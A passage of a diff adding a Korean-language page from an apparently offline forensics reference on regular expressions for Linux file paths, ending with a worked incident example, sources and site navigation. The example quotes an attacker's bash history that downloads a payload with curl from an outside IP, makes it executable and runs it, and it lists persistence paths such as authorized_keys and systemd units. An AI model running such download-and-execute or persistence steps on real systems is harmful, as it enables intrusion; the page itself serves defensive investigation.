+   /tmp/systemd-private-3f2a-upower.service-Xk2Lp9
+
+   4건. tar.gz 와 systemd-private 는 정상 패턴이다.
+   `/dev/shm/.k` 와 `/tmp/.build` 가 숨김 이름이라 남는다.
+
+3. 원문 문맥 확인
+   $ grep -n -E &#39;/dev/shm/\.k|/tmp/\.build&#39; bash_history
+   288:curl -s http://198.51.100.5/k -o /dev/shm/.k
+   289:chmod +x /dev/shm/.k
+   290:/dev/shm/.k &amp;
+   301:mkdir /tmp/.build
+   302:cp /dev/shm/.k /tmp/.build/kworker
+
+   `/dev/shm` 은 tmpfs 라서 재부팅하면 사라진다.
+   그래서 공격자가 `/tmp/.build/kworker` 로 복사했다.
+
+4. 두 번째 시도 (실패) -- 지속성을 crontab 에서 찾으려 했다
+   $ grep -E &#39;crontab&#39; bash_history
+   (0건)
+
+   이유: 이 공격자는 `crontab` 명령을 쓰지 않았다.
+        명령 이름으로 찾는 대신 **지속성 경로**로 찾아야 한다.
+
+5. 접근 변경 -- 지속성 경로 목록으로 검색
+   $ grep -Eo &#39;/etc/(crontab|cron\.[a-z.]+|systemd/system|rc\.local|ld\.so\.preload)[^[:space:]]*|/(home/[^/]+|root)/\.ssh/authorized_keys&#39; bash_history | sort -u
+   /etc/systemd/system/kworker.service
+   /root/.ssh/authorized_keys
+
+   두 가지 지속성이 나왔다.
+
+6. auth.log 로 교차검증 -- 키가 추가된 뒤 접속했는가
+   $ grep -E &#39;Accepted (publickey|password)&#39; auth.log | tail -3
+   Mar 14 07:18:39 web01 sshd[3901]: Accepted password for svc_backup from 198.51.100.5 port 52890 ssh2
+   Mar 14 08:02:11 web01 sshd[4820]: Accepted publickey for root from 198.51.100.5 port 41002 ssh2: RSA SHA256:kQ9...
+   Mar 14 09:47:03 web01 sshd[6114]: Accepted publickey for root from 203.0.113.90 port 33188 ssh2: RSA SHA256:kQ9...
+
+   같은 키 지문으로 다른 IP 에서 root 로 재접속했다.
+   `authorized_keys` 추가가 실제로 사용됐다는 확증이다.
+
+7. 세 번째 확인 -- 경로 존재 검증으로 오탐 제거
+   $ grep -Eoh &#39;(/[^/[:space:]]+)+&#39; bash_history | sort -u |
+       while IFS= read -r p; do [ -e &quot;$p&quot; ] || printf &#39;MISSING %s\n&#39; &quot;$p&quot;; done | head -3
+   MISSING /dev/shm/.k
+   MISSING /tmp/nginx-1.24.0.tar.gz
+
+   `/dev/shm/.k` 가 사라진 것은 재부팅 때문이다(tmpfs).
+   반면 `/tmp/.build/kworker` 는 남아 있다 -&gt; 회수 대상.
+
+정답: 페이로드 /tmp/.build/kworker (최초 드롭 /dev/shm/.k)
+      지속성 /etc/systemd/system/kworker.service + /root/.ssh/authorized_keys</code></pre></div>
+<p>1단계와 4단계가 교훈이다. <strong><code>*</code>는 와일드카드가 아니라 반복 수량자이고, 지속성은 명령 이름이 아니라 경로로 찾는다.</strong></p>
+<h2 id="출처">출처</h2>
+<ul><li>SRC-080 — Filesystem Hierarchy Standard 3.0: <code>/etc</code> <code>/var/log</code> <code>/tmp</code> <code>/var/tmp</code> <code>/run</code> <code>/proc</code> <code>/usr/local</code> <code>/opt</code> <code>/boot</code> 의 정의된 용도, <code>/var/tmp</code>가 재부팅 후에도 보존된다는 규정, <code>/tmp</code> 삭제 정책</li><li>SRC-057 — Python 문서, <code>re</code>: 문자 클래스, lookbehind 제약, <code>os.path</code>/<code>posixpath</code> 정규화</li><li><code>auth.log</code> vs <code>secure</code>, <code>crontabs/&lt;user&gt;</code> vs <code>cron/&lt;user&gt;</code> 등 로그·crontab 경로는 배포판과 버전에 따라 다르므로 대상 시스템에서 실제 파일 존재를 확인할 것</li><li><code>/dev/shm</code>, <code>/run/shm</code>의 마운트 여부와 <code>noexec</code> 옵션은 배포판 설정에 따라 다르므로 <code>mount</code>로 확인할 것</li><li>경로 최대 길이(구성요소 255바이트, 전체 4096바이트)는 리눅스의 일반적인 값이며 파일시스템과 커널 설정에 따라 다를 수 있다</li></ul>
+      </div>
+      <section class="related">
+  <h2>관련 글</h2>
+  <div class="related-grid">
+  <a class="related-item" href="./windows-path-regex.html">
+    <span class="rel-id">FOR-0137 · 로그/Regex</span>
+    Windows 경로 regex: 백슬래시 이스케이프와 UNC·확장 길이 접두
+  </a>
+  <a class="related-item" href="./ipv4-regex.html">
+    <span class="rel-id">FOR-0128 · 로그/Regex</span>
+    IPv4 주소 regex: 느슨한 패턴과 엄격한 패턴 골라 쓰기
+  </a>
+  <a class="related-item" href="./iso-timestamp-regex.html">
+    <span class="rel-id">FOR-0139 · 로그/Regex</span>
+    ISO 8601 / RFC 3339 timestamp regex와 UTC 정규화
+  </a>
+  <a class="related-item" href="./grep-e-regex.html">
+    <span class="rel-id">FOR-0113 · 로그/Regex</span>
+    grep -E 확장 정규표현식(ERE) 실전: BRE와의 차이와 lookaround 대안
+  </a>
+  </div>
+</section>
+      <div class="pager">
+<a class="related-item" href="./windows-path-regex.html"><span class="rel-id">← FOR-0137</span>Windows 경로 regex: 백슬래시 이스케이프와 UNC·확장 길이 접두</a>
+<a class="related-item" href="./iso-timestamp-regex.html"><span class="rel-id">FOR-0139 →</span>ISO 8601 / RFC 3339 timestamp regex와 UTC 정규화</a>
+      </div>
+    </article>
+<aside class="toc">
+  <div class="toc-title">목차</div>
+  <ul>
+<li class="toc-l2"><a href="#한-줄-결론">한 줄 결론</a></li>
+<li class="toc-l2"><a href="#개념">개념</a></li>
+<li class="toc-l3"><a href="#는-파일시스템이-아니라-셸이-처리한다">`~`는 파일시스템이 아니라 셸이 처리한다</a></li>
+<li class="toc-l3"><a href="#공백특수문자가-들어간-경로">공백·특수문자가 들어간 경로</a></li>
+<li class="toc-l2"><a href="#파일-경로">파일 / 경로</a></li>
+<li class="toc-l3"><a href="#varlog-하위">`/var/log` 하위</a></li>
+<li class="toc-l2"><a href="#주요-필드">주요 필드</a></li>
+<li class="toc-l3"><a href="#패턴-1-절대경로-후보-가장-많이-쓴다">패턴 1 — 절대경로 후보 (가장 많이 쓴다)</a></li>
+<li class="toc-l3"><a href="#패턴-2-확장자로-끝을-고정-정밀도-우선">패턴 2 — 확장자로 끝을 고정 (정밀도 우선)</a></li>
+<li class="toc-l3"><a href="#패턴-3-world-writable-디렉터리-의심-1순위">패턴 3 — world-writable 디렉터리 (의심 1순위)</a></li>
+<li class="toc-l3"><a href="#패턴-4-숨김-파일디렉터리">패턴 4 — 숨김 파일·디렉터리</a></li>
+<li class="toc-l3"><a href="#패턴-5-ssh-키자격증명-경로">패턴 5 — SSH 키·자격증명 경로</a></li>
+<li class="toc-l3"><a href="#심볼릭-링크">심볼릭 링크</a></li>
+<li class="toc-l2"><a href="#빠른-명령">빠른 명령</a></li>
+<li class="toc-l2"><a href="#함께-보는-artifact">함께 보는 artifact</a></li>
+<li class="toc-l2"><a href="#흔한-실수">흔한 실수</a></li>
+<li class="toc-l2"><a href="#mini-example">mini example</a></li>
+<li class="toc-l2"><a href="#출처">출처</a></li>
+  </ul>
+</aside>
+  </div>
+</main>
+<footer class="site-footer">
+  완전 오프라인 · 인터넷/CDN 없음 · build 2026-09-10 08:40 KST
+</footer>
+<script src="../assets/search-index.js"></script>
+<script src="../assets/search-core.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
